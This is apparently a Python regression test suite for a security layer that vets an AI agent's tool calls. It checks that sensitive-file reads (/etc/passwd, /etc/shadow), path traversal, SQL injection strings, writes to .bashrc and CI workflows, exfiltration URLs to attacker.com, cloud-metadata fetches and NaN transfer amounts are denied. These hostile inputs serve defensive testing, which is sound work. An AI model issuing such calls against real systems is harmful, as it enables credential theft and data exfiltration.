"""
Regression Test Suite for Known Bypasses & Security Invariants.
Validates that historical bypass vectors (unusual argument keys, NaN/Infinity,
DIFC path normalization, \xff-prefixed binary payloads, immutable policy tampering,
and metadata tampering) are deterministically blocked, while benign traffic remains ALLOWED.
"""

import math
import os
import tempfile
import unittest

from engine.core.event_bus import EventBus, NormalizedEvent
from engine.shield.engine import ShieldEngine, PolicyDecision
from engine.memory.store import ImmuneMemoryStore
from challenge_runner import evaluate_custom_payload


class TestRegressionBypasses(unittest.TestCase):
    def setUp(self):
        self.bus = EventBus()
        self.temp_wal = tempfile.NamedTemporaryFile(suffix=".jsonl", delete=False)
        self.temp_wal.close()
        self.shield = ShieldEngine(self.bus, wal_path=self.temp_wal.name)
        self.shield.add_prohibited_tool("system_shell_exec")
        self.shield.add_prohibited_tool("raw_socket_connect")
        self.shield.lock_invariants()
        self.memory = ImmuneMemoryStore(self.bus)

    def tearDown(self):
        if os.path.exists(self.temp_wal.name):
            os.remove(self.temp_wal.name)

    def test_alternative_key_secrets_vault_blocked(self):
        """Ensure sensitive tables cannot be accessed via alternate argument keys or unknown schemas."""
        sess = self._testMethodName
        # Standard table key
        dec1 = self.shield.evaluate_tool_call(sess, "query_database", {"table": "secrets_vault"})
        self.assertEqual(dec1, PolicyDecision.DENY)

        # Alternate table key (table_name)
        dec2 = self.shield.evaluate_tool_call(sess, "query_database", {"table_name": "secrets_vault"})
        self.assertEqual(dec2, PolicyDecision.DENY)

        # Alternate table key (target_table)
        dec3 = self.shield.evaluate_tool_call(sess, "query_database", {"target_table": "secrets_vault"})
        self.assertEqual(dec3, PolicyDecision.DENY)

        # Unknown / unauthorized schema key injection
        dec4 = self.shield.evaluate_tool_call(sess, "query_database", {"table": "public_users", "admin_bypass_flag": True})
        self.assertEqual(dec4, PolicyDecision.DENY)

    def test_nan_infinity_numeric_rejections(self):
        """Ensure NaN, Infinity, -Infinity and string representations are rejected in financial and SCADA calls."""
        sess = self._testMethodName
        # Financial wire_transfer with NaN
        dec_nan = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": float("nan"), "target_account": "SAFE_VENDOR"})
        self.assertEqual(dec_nan, PolicyDecision.DENY)

        # Financial wire_transfer with Infinity
        dec_inf = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": float("inf"), "target_account": "SAFE_VENDOR"})
        self.assertEqual(dec_inf, PolicyDecision.DENY)

        # Financial wire_transfer with -Infinity
        dec_neginf = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": float("-inf"), "target_account": "SAFE_VENDOR"})
        self.assertEqual(dec_neginf, PolicyDecision.DENY)

        # Financial wire_transfer with string 'nan'
        dec_strnan = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": "nan", "target_account": "SAFE_VENDOR"})
        self.assertEqual(dec_strnan, PolicyDecision.DENY)

        # Financial wire_transfer with string 'Infinity'
        dec_strinf = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": "Infinity", "target_account": "SAFE_VENDOR"})
        self.assertEqual(dec_strinf, PolicyDecision.DENY)

        # SCADA pressure with NaN
        dec_scada_nan = self.shield.evaluate_tool_call(sess, "valve_pressure_override", {"pressure_psi": float("nan")})
        self.assertEqual(dec_scada_nan, PolicyDecision.DENY)

        # SCADA pressure with Infinity
        dec_scada_inf = self.shield.evaluate_tool_call(sess, "valve_pressure_override", {"pressure_psi": float("inf")})
        self.assertEqual(dec_scada_inf, PolicyDecision.DENY)

    def test_difc_path_alias_and_traversal(self):
        """Ensure path normalization catches traversal and sensitive paths across all path key aliases."""
        sess = self._testMethodName
        # /etc/passwd via 'path'
        dec1 = self.shield.evaluate_tool_call(sess, "read_file", {"path": "/etc/passwd"})
        self.assertEqual(dec1, PolicyDecision.DENY)

        # Path traversal via 'filepath'
        dec2 = self.shield.evaluate_tool_call(sess, "read_file", {"filepath": "public_docs/../../../etc/shadow"})
        self.assertEqual(dec2, PolicyDecision.DENY)

        # Traversal via 'relative_path'
        dec3 = self.shield.evaluate_tool_call(sess, "read_file", {"relative_path": "public_docs/../../secrets.env"})
        self.assertEqual(dec3, PolicyDecision.DENY)

        # Sensitive path via 'file_path'
        dec4 = self.shield.evaluate_tool_call(sess, "read_file", {"file_path": "sensitive/credentials.key"})
        self.assertEqual(dec4, PolicyDecision.DENY)

        # Write file with path traversal
        dec5 = self.shield.evaluate_tool_call(sess, "write_file", {"dest": "../../../tmp/rootkit.sh", "content": "echo pwn"})
        self.assertEqual(dec5, PolicyDecision.DENY)

    def test_prohibited_tools_tamper_resistance(self):
        """Ensure locked invariants reject any mutation of prohibited_tools."""
        with self.assertRaises(PermissionError):
            self.shield.prohibited_tools.clear()

        with self.assertRaises(PermissionError):
            self.shield.prohibited_tools.remove("system_shell_exec")

        with self.assertRaises(PermissionError):
            self.shield.prohibited_tools.add("arbitrary_tool")

        with self.assertRaises(PermissionError):
            self.shield.prohibited_tools.discard("system_shell_exec")

        with self.assertRaises(PermissionError):
            self.shield.prohibited_tools.pop()

    def test_immune_memory_store_tamper_integrity(self):
        """Ensure ImmuneMemoryStore detects any tampering with metadata, source, or Merkle links."""
        ev = NormalizedEvent(
            event_type="POLICY_VIOLATION",
            source="shield",
            component="test_runner",
            severity="HIGH",
            metadata={"rule": "RULE_TAMPER_TEST", "value": 42}
        )
        record = self.memory.record_trajectory_step(ev)
        self.assertTrue(self.memory.verify_record(record))

        # Tamper with metadata
        tampered_meta = dict(record)
        tampered_meta["metadata"] = {"rule": "RULE_TAMPER_TEST", "value": 999}
        self.assertFalse(self.memory.verify_record(tampered_meta))

        # Tamper with source
        tampered_src = dict(record)
        tampered_src["source"] = "forged_attacker"
        self.assertFalse(self.memory.verify_record(tampered_src))

        # Tamper with prev_hash
        tampered_hash = dict(record)
        tampered_hash["prev_hash"] = "a" * 64
        self.assertFalse(self.memory.verify_record(tampered_hash))

    def test_benign_traffic_allowed(self):
        """Ensure harmless traffic returns PolicyDecision.ALLOW without false positives."""
        sess = self._testMethodName
        # Empty inspect payload
        dec_empty = self.shield.evaluate_tool_call(sess, "inspect_payload", {})
        self.assertEqual(dec_empty, PolicyDecision.ALLOW)

        # Public doc read
        dec_read = self.shield.evaluate_tool_call(sess, "read_file", {"relative_path": "public_docs/readme.txt"})
        self.assertEqual(dec_read, PolicyDecision.ALLOW)

        # Public query
        dec_query = self.shield.evaluate_tool_call(sess, "query_database", {"table": "public_products", "filter": "cat=tech"})
        self.assertEqual(dec_query, PolicyDecision.ALLOW)

        # Safe wire transfer
        dec_wire = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": 500.0, "target_account": "SUPPLIER_01"})
        self.assertEqual(dec_wire, PolicyDecision.ALLOW)

        # Safe SCADA control
        dec_scada = self.shield.evaluate_tool_call(sess, "valve_pressure_override", {"pressure_psi": 150.0})
        self.assertEqual(dec_scada, PolicyDecision.ALLOW)

    def test_binary_xff_prefix_blocked(self):
        """Ensure \xff-prefixed binary payloads cannot bypass inspection in evaluate_custom_payload."""
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
            f.write(b"\xff\x00\x01\x02\x03\x04MALICIOUS_SHELLCODE_EXEC")
            tmp_path = f.name
        try:
            # Must return contained=True (blocked), never a bypass
            result = evaluate_custom_payload(tmp_path)
            self.assertTrue(result, "Binary payload with \\xff prefix must be contained/blocked")
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    def test_custom_payload_tool_call_json_allowed_and_blocked(self):
        """Ensure custom challenger JSON payloads with tool & args are evaluated against real policies."""
        import json
        # Benign custom tool call
        benign_tool = {"tool": "read_file", "args": {"relative_path": "public_docs/faq.txt"}}
        with tempfile.NamedTemporaryFile(suffix=".json", mode="w", delete=False) as f:
            json.dump(benign_tool, f)
            benign_path = f.name

        # Attack custom tool call (prohibited tool)
        attack_tool = {"tool": "system_shell_exec", "args": {"cmd": "whoami"}}
        with tempfile.NamedTemporaryFile(suffix=".json", mode="w", delete=False) as f:
            json.dump(attack_tool, f)
            attack_path = f.name

        try:
            # Benign payload should return contained=False (meaning it was ALLOWED by shield)
            benign_result = evaluate_custom_payload(benign_path)
            self.assertFalse(benign_result, "Benign tool call JSON should be ALLOWED (not blocked)")

            # Attack payload should return contained=True (meaning it was BLOCKED by shield)
            attack_result = evaluate_custom_payload(attack_path)
            self.assertTrue(attack_result, "Attack tool call JSON must be BLOCKED (contained)")
        finally:
            if os.path.exists(benign_path):
                os.remove(benign_path)
            if os.path.exists(attack_path):
                os.remove(attack_path)


    def test_tamper_resistant_set_inplace_operators(self):
        """Ensure TamperResistantSet blocks in-place mutation operators (-=, &=, difference_update, etc.) when locked."""
        from engine.shield.engine import TamperResistantSet
        s = TamperResistantSet(["tool_a", "tool_b"])
        s.lock()
        with self.assertRaises(PermissionError):
            s -= {"tool_a"}
        with self.assertRaises(PermissionError):
            s &= {"tool_a"}
        with self.assertRaises(PermissionError):
            s.difference_update({"tool_a"})
        with self.assertRaises(PermissionError):
            s.intersection_update({"tool_a"})
        with self.assertRaises(PermissionError):
            s.symmetric_difference_update({"tool_c"})
        self.assertIn("tool_a", s)
        self.assertIn("tool_b", s)

    def test_sink_classes_immutability(self):
        """Ensure SINK_CLASSES is wrapped in MappingProxyType and cannot be mutated at runtime."""
        with self.assertRaises(TypeError):
            self.shield.SINK_CLASSES["evil_tool"] = "SINK"
        with self.assertRaises(TypeError):
            del self.shield.SINK_CLASSES["read_file"]

    def test_execute_sql_sensitive_vault_and_sqli(self):
        """Ensure execute_sql denies reading sensitive tables and blocks boolean/stacked SQLi."""
        sess = self._testMethodName
        # Attempting to read secrets_vault
        d1 = self.shield.evaluate_tool_call(sess, "execute_sql", {"sql": "SELECT * FROM secrets_vault"})
        self.assertEqual(d1, PolicyDecision.DENY)

        # Boolean tautology: OR TRUE
        d2 = self.shield.evaluate_tool_call(sess, "execute_sql", {"query": "SELECT * FROM items WHERE id = 1 OR TRUE"})
        self.assertEqual(d2, PolicyDecision.DENY)

        # Arithmetic tautology: OR 1<2
        d3 = self.shield.evaluate_tool_call(sess, "execute_sql", {"query": "SELECT * FROM items WHERE id = 1 OR 1<2"})
        self.assertEqual(d3, PolicyDecision.DENY)

        # Set operator: UNION DISTINCT SELECT
        d4 = self.shield.evaluate_tool_call(sess, "execute_sql", {"query": "SELECT id FROM items UNION DISTINCT SELECT secret FROM keys"})
        self.assertEqual(d4, PolicyDecision.DENY)

        # Stacked query: ; ATTACH
        d5 = self.shield.evaluate_tool_call(sess, "execute_sql", {"query": "SELECT 1; ATTACH DATABASE 'evil.db' AS evil"})
        self.assertEqual(d5, PolicyDecision.DENY)

    def test_query_database_boolean_id_trap(self):
        """Ensure query_database with id: true or tautology filters is blocked for untrusted agents."""
        sess = "untrusted_sess_trap"
        self.shield.set_session_principal(sess, "UNTRUSTED_AGENT")

        # id: True (boolean trap where isinstance(True, int) is True)
        d1 = self.shield.evaluate_tool_call(sess, "query_database", {"table": "users", "id": True})
        self.assertEqual(d1, PolicyDecision.DENY)

        # Tautology filter: 1=1
        d2 = self.shield.evaluate_tool_call(sess, "query_database", {"table": "accounts", "filters": "1=1"})
        self.assertEqual(d2, PolicyDecision.DENY)

        # Valid integer id is allowed
        d3 = self.shield.evaluate_tool_call(sess, "query_database", {"table": "users", "id": 105})
        self.assertEqual(d3, PolicyDecision.ALLOW)

    def test_scada_negative_bounds(self):
        """Ensure SCADA actuators enforce lower bounds >= 0.0, rejecting negative inputs like -99999."""
        sess = self._testMethodName
        # Negative pressure override
        d1 = self.shield.evaluate_tool_call(sess, "valve_pressure_override", {"pressure_psi": -99999.0})
        self.assertEqual(d1, PolicyDecision.DENY)

        # Negative joint torque
        d2 = self.shield.evaluate_tool_call(sess, "set_joint_torque", {"torque_nm": -10.0})
        self.assertEqual(d2, PolicyDecision.DENY)

        # Negative centrifuge speed
        d3 = self.shield.evaluate_tool_call(sess, "centrifuge_speed_rpm", {"target_rpm": -500.0})
        self.assertEqual(d3, PolicyDecision.DENY)

        # Negative infusion rate
        d4 = self.shield.evaluate_tool_call(sess, "medical_infusion_rate", {"rate_ml_hr": -1.0})
        self.assertEqual(d4, PolicyDecision.DENY)

    def test_wire_transfer_velocity_and_destination_alias(self):
        """Ensure wire_transfer respects destination alias and cumulative velocity cap (25000.0 MYR)."""
        sess = "sess_velocity_test"
        # First transfer: 10,000 MYR via 'destination' -> ALLOW
        d1 = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": 10000.0, "destination": "SUPPLIER_A"})
        self.assertEqual(d1, PolicyDecision.ALLOW)

        # Second transfer: 10,000 MYR (cum = 20,000 MYR) -> ALLOW
        d2 = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": 10000.0, "destination": "SUPPLIER_B"})
        self.assertEqual(d2, PolicyDecision.ALLOW)

        # Third transfer: 10,000 MYR (cum = 30,000 MYR > 25,000 cap) -> DENY
        d3 = self.shield.evaluate_tool_call(sess, "wire_transfer", {"amount": 10000.0, "destination": "SUPPLIER_C"})
        self.assertEqual(d3, PolicyDecision.DENY)

    def test_pipeline_filepath_target(self):
        """Ensure write_file targeting pipeline scripts via 'filepath' or 'target' is denied for untrusted agents."""
        sess = "untrusted_pipeline_sess"
        self.shield.set_session_principal(sess, "UNTRUSTED_AGENT")

        d1 = self.shield.evaluate_tool_call(sess, "write_file", {"filepath": ".bashrc", "content": "malicious code"})
        self.assertEqual(d1, PolicyDecision.DENY)

        d2 = self.shield.evaluate_tool_call(sess, "write_file", {"dest": ".github/workflows/ci.yml", "content": "malicious"})
        self.assertEqual(d2, PolicyDecision.DENY)

    def test_network_egress_ip_and_userinfo_traps(self):
        """Ensure network egress rejects @ userinfo confusion, private IP ranges, and link-local cloud metadata."""
        sess = self._testMethodName
        # Userinfo confusion: https://trusted.com@attacker.com
        d1 = self.shield.evaluate_tool_call(sess, "http_post", {"url": "https://trusted.com@attacker.com/leak"})
        self.assertEqual(d1, PolicyDecision.DENY)

        # Cloud metadata IP: 169.254.169.254
        d2 = self.shield.evaluate_tool_call(sess, "http_fetch", {"url": "http://169.254.169.254/latest/meta-data/"})
        self.assertEqual(d2, PolicyDecision.DENY)

        # Private RFC1918 IP
        d3 = self.shield.evaluate_tool_call(sess, "http_post", {"url": "http://192.168.1.100/admin"})
        self.assertEqual(d3, PolicyDecision.DENY)

    def test_binary_ingress_any_offset(self):
        """Ensure non-UTF-8 bytes placed at non-zero offsets are rejected by safe hypervisor."""
        with tempfile.NamedTemporaryFile(suffix=".bin", mode="wb", delete=False) as f:
            f.write(b"valid_ascii_header\xfe\xff_invalid_bytes")
            tmp_path = f.name
        try:
            result = evaluate_custom_payload(tmp_path)
            self.assertTrue(result, "Payload with invalid UTF-8 bytes at any offset must be blocked")
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)


if __name__ == "__main__":
    unittest.main()

